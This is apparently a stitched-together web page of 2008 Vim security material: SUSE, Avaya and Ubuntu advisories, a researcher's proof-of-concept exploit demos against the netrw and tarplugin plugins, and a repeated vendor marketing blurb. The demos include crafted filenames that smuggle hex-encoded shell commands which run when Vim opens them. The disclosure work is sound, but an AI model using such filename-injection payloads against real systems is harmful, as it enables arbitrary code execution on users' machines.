$ make -s clean sploit
$ readlink exploit | cat -vT
./sploit/pi\_netrw.txt^I^I^I^I^I^I^I^I^I^I^I^I^I^I^I^I^I^I^I^I|ne
w|norm^Ii:q^Vx21^[o:so^Vx25^Vx2a^[ggyG\_at\_0
$ ls pwned
ls: cannot access pwned: No such file or directory
$ vim "`dirname "`readlink exploit`"`"
[ Place cursor on ``pi\_netrw.txt''. Press <Return>, 'P' or 'o']
[ Observe that the file looks more or less normal ]
$ ls pwned
pwned
For your convenience, running ``make demo'' and ``make test'' in the netrw
directory will do all the hard work in an interactive, and non-interactive way,
respectively, and tell you whether the exploit has worked.
For details on the exploit construction, see the file ``exploit\_name''.
Note: ``make test'' may hang when run from within vim.
3.4.3. Documentation
We have not seen the insecure properties of ``execute'' mentioned in Vim
documentation. To the contrary, ``execute'' is being used without precautions
throughout. For example, in ``eval.txt'', a file name is passed to ``execute''
insecurely:
7238 :function! Write(file)
7239 : try
\*7240 : execute "write" a:file
4. Footnotes
[1] Really a URL -- local file path without a scheme is a special case; we
haven't explored remote issues, but they might be interesting.
[2] shellescape() was introduced in patch 7.0.111, and is not used at all as
of version 7.1.298. Naive quoting is in being used instead, throughout the
code. A typical example from the ``netrwFileHandlers.vim'' file:
\*99 exe "!mozilla ".g:netrw\_shq.page.g:netrw\_shq
``g:netrw\_shq'' being the shell quoting character of choice, a single or a
double quote.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

1) Solved Security Vulnerabilities
To avoid flooding mailing lists with SUSE Security Announcements for minor
issues, SUSE Security releases weekly summary reports for the low profile
vulnerability fixes. The SUSE Security Summary Reports do not list or
download URLs like the SUSE Security Announcements that are released for
more severe vulnerabilities.
Fixed packages for the following incidents are already available on our FTP
server and via the YaST Online Update.
- vim, gvim
The VI Improved editor (vim) was prone to several security problems:
CVE-2008-4677: The netrw plugin sent credentials to all servers.
CVE-2008-2712: Arbitrary code execution in vim helper plugins
filetype, zip, xpm, gzip and netrw.
CVE-2008-3074: tarplugin code injection
CVE-2008-3075: zipplugin code injection
CVE-2008-3076: several netrw bugs, code injection
CVE-2008-6235: code injection in the netrw plugin
CVE-2008-4677: credential disclosure by netrw plugin
Affected Products: openSUSE 10.3-11.1, SLES9, SLES10
On openSUSE vim was upgraded to version 7.2.108 to fix those issues.
SLES9 and 10 were only affected by a subset, patches were backported
to fix the problems.
- apache2
A DoS condition in apache2's mod\_proxy has been fixed
(CVE-2008-2364).
Affected Products: openSUSE 10.3
- opera
Opera 9.64 is a recommended security and stability upgrade,
incorporating the Opera Presto 2.1.1 user agent engine. Opera highly
recommends all users to upgrade to Opera 9.64 to take advantage of
these improvements (CVE-2009-0914, CVE-2009-0915, CVE-2009-0916).
A detailed changelog can be found at
<http://www.opera.com/docs/changelogs/linux/964/>
- multipath tools
/var/run/multipathd.sock was world-writable allowing local users to
issue commands to the multipath daemon (CVE-2009-0115).
Affected Products: openSUSE 10.3-11.0, SLES10
- java-1\_6\_0-openjdk
Specially crafted image files could cause an integer overflow in the
lcms library contained in openjdk. Attackers could potentially
exploit that to crash applications using lcms or even execute
arbitrary code (CVE-2009-0723, CVE-2009-0581, CVE-2009-0733).
Previous update packages contained broken dependencies and couldn't
be installed. Therefore the update had to be re-released.
Affected Products: openSUSE 11.0 and 11.1
- imp
Version update to IMP 4.1.6 fixes a problem with validating HTTP requests that
allowed attackers to delete emails (CVE-2007-6018) and some
cross-site-scripting issues (CVE-2009-0930).
Affected Products: openSUSE 10.3-11.0
- horde
Version update to horde 3.1.9 fixes a cross-site-scripting (XSS) issue
(CVE-2008-5917) and an include file problem (CVE-2009-0932).
Affected Products: openSUSE 10.3-11.0
- lcms
Specially crafted image files could cause an integer overflow in
lcms. Attackers could potentially exploit that to crash applications
using lcms or even execute arbitrary code (CVE-2009-0723,
CVE-2009-0581, CVE-2009-0733).
Affected Products: openSUSE 10.3-11.1, SLES9, SLES10
- moodle
moodle was prone to several cross-site-scripting (XSS) and
cross-site-request-forgery (CSRF) problems (CVE-2009-0499, CVE-2009-0500,
CVE-2009-0501, CVE-2009-0502).
Affected Products: openSUSE 10.3-11.0
- ghostscript
Integer overflows and missing upper bounds checks in Ghostscript's
ICC library potentially allowed attackers to crash Ghostscript or
even cause execution of arbitrary code via specially crafted PS or
PDF files (CVE-2009-0583, CVE-2009-0584).
Affected Products: openSUSE 10.3-11.0, SLES9, SLES10

2) Pending Vulnerabilities, Solutions, and Work-Arounds
- NetworkManager
The NetworkManager update caused WLAN to stop working on some
systems. Those systems most likely have a stale directory
/var/run/dbus/at\_console/root. It's most likely a leftover from a
root session. Removing the directory and restarting networking
should fix the problems. Please avoid logging in as root in the future.

3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.
=====================================================================
SUSE's security contact is <security@suse.com> or <security@suse.de>.

vim security update (RHSA-2008-0617)

Original Release Date: January 5, 2009

Last Revised: June 5, 2009

Number: ASA-2009-001

Risk Level: Low

Advisory Version: 5.0

Advisory Status: Interim

---

## 1. Overview:

Vim (Visual editor IMproved) is an updated and improved version of
the vi
editor.

Several input sanitization flaws were found in Vim's keyword and tag
handling. If Vim looked up a document's maliciously crafted tag or
keyword,
it was possible to execute arbitrary code as the user running Vim.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has
assigned the name [CVE-2008-4101](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4101) to this issue.

A heap-based overflow flaw was discovered in Vim's expansion of file
name
patterns with shell wildcards. An attacker could create a
specially-crafted
file or directory name that, when opened by Vim, caused the application
to
crash or, possibly, execute arbitrary code. The Common Vulnerabilities
and Exposures project (cve.mitre.org) has assigned the name
[CVE-2008-3432](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3432) to this issue.

Several input sanitization flaws were found in various Vim system
functions. If a user opened a specially crafted file, it was possible to
execute arbitrary code as the user running Vim. The Common
Vulnerabilities and Exposures project (cve.mitre.org) has assigned the
name
[CVE-2008-2712](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2712) to this issue.

A format string flaw was discovered in
Vim's help tag processor. If a user was tricked into executing the
"helptags" command on malicious data, arbitrary code could be executed
with
the permissions of the user running Vim. The Common Vulnerabilities
and Exposures project (cve.mitre.org) has assigned the name
[CVE-2007-2953](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2953) to this issue.

More information about these vulnerabilities can be found in the
security advisory issued by RedHat Linux:

* <https://rhn.redhat.com/errata/RHSA-2008-0617.html>

Avaya has rated this as a Low risk level as either the package is
installed but not used by any application or exploitation would require
direct non-standard user interaction.

enforced through the use of physical security, firewalls, ACLs,
VPNs, and other generally-accepted networking practices until such
time as an update becomes available and can be installed.

## 3. Avaya Software-Only Products:

Avaya software-only products operate on general-purpose operating
systems.
Occasionally vulnerabilities may be discovered in the underlying
operating system or
applications that come with the operating system. These vulnerabilities
often do not
impact the software-only product directly but may threaten the integrity
of the
underlying platform.

In the case of this advisory Avaya software-only products are not
affected by the
vulnerability directly but the underlying Linux platform may be.
Customers should
determine on which Linux operating system the product was installed and
then follow
that vendor's guidance.

| Product: | Actions: |
| --- | --- |
| CVLAN | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the CVLAN application. |

| Voice Portal | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the Voice Portal application. |

**Recommended Actions:**
In the event that the affected package
is installed, Avaya recommends that customers follow recommended actions
supplied by RedHat Linux.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

I do apologize: as written in the advisory, the version I worked with
was 7.1.298.  7.1.314 was only partly vulnerable.  FWIW, I have
updated the advisory at <http://www.rdancer.orgvulnerablevim.html> .

Thanks to Bram for all the good work.

7.2a.10 with updated runtime is still vulnerable to the zipplugin
attack, and an updated tarplugin attack:

-------------------------------------------
-------- Test results below ---------------
-------------------------------------------
filetype.vim
  strong  : EXPLOIT FAILED
  weak    : EXPLOIT FAILED
tarplugin : EXPLOIT FAILED
tarplugin.updated: VULNERABLE
zipplugin : VULNERABLE
xpm.vim
  xpm     : EXPLOIT FAILED
  xpm2    : EXPLOIT FAILED
  remote  : EXPLOIT FAILED
gzip_vim  : EXPLOIT FAILED
netrw     : EXPLOIT FAILED

The original tarplugin exploit now produces a string of telling error messages:

        /bin/bash: so%: command not found
        tar: /home/rdancer/vuln/vim/tarplugin/sploit/foo'|sosploit/foo:
Cannot open: No such file or directory
        tar: Error is not recoverable: exiting now
        /bin/bash: retu: command not found
        /bin/bash: bar.tar|retu|'bar.tar: command not found

It's easy to see that it is still possible to execute arbitrary shell commands.

$VIMRUNTIME/autoload/tar.vim of Vim 7.2a.10:

        136   if tarfile =~# '\.\(gz\|tgz\)$'
        137 "   call Decho("1: exe silent r! gzip -d -c
".s:Escape(tarfile)." | ".g:tar_cmd." -".g:tar_browseoptions." - ")
       *138    exe "silent r! gzip -d -c -- ".s:Escape(tarfile)." |

        139   elseif tarfile =~# '\.lrp'

        145   else
        146 "   call Decho("4: exe silent r! ".g:tar_cmd."

      **147    exe "silent r! ".g:tar_cmd." -".g:tar_browseoptions."

        [...]

        450   endif
        451   return qnameq
        452 endfun

 (*) s:Escape() does not suffice, as it fails to escape ``%'' and friends.

(**) tar(1) allows arbitrary command execution via options ``--to-command'',
     and ``--use-compress-program''.

The updated tarplugin attack is rather simple:

        $ rm -rf ./*
        $ touch "foo%;eval eval \`echo 0:64617465203e2070776e6564 |
xxd -r\`;'bar.tar"
        $ vim +:q ./foo*
        $ ls -l pwned
        -rw-r--r-- 1 rdancer users 29 2008-07-01 20:18 pwned

vim security update (RHSA-2008-0618)

Original Release Date: November 26, 2008

Last Revised: November 26, 2008

Number: ASA-2008-457

Risk Level: None

Advisory Version: 1.0

Advisory Status: Final

---

## 1. Overview:

Vim (Visual editor IMproved) is an updated and improved version of
the vi
editor.

* Several input sanitization flaws were found in Vim's keyword
  and tag
  handling. If Vim looks up a document's maliciously crafted tag or
  keyword,
  it is possible to execute arbitrary code as the user running
  Vim.

* Several input sanitization flaws were found in various Vim
  system
  functions. If a user opens a specially crafted file, it is possible to
  execute arbitrary code as the user running Vim.

The Common Vulnerabilities and Exposures project (cve.mitre.org) has
assigned the names [CVE-2008-4101](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2712) and [CVE-2008-2712](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4101) to these issues.

More information about these vulnerabilities can be found in the
security advisory issued by RedHat
Linux:

* [https://rhn.redha
  t.com/errata/RHSA-2008-0618.html](https://rhn.redhat.com/errata/RHSA-2008-0618.html)

## Releases

* [Ubuntu 8.10](/security/notices?release=intrepid)
* [Ubuntu 8.04](/security/notices?release=hardy)
* [Ubuntu 7.10](/security/notices?release=gutsy)
* [Ubuntu 6.06](/security/notices?release=dapper)

## Packages

* [vim](/security/cves?package=vim) -

## Details

Jan Minar discovered that Vim did not properly sanitize inputs before invoking

the execute or system functions inside Vim scripts. If a user were tricked

into running Vim scripts with a specially crafted input, an attacker could

execute arbitrary code with the privileges of the user invoking the program.

([CVE-2008-2712](/security/CVE-2008-2712))

Ben Schmidt discovered that Vim did not properly escape characters when

performing keyword or tag lookups. If a user were tricked into running specially

crafted commands, an attacker could execute arbitrary code with the privileges

of the user invoking the program. ([CVE-2008-4101](/security/CVE-2008-4101))

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
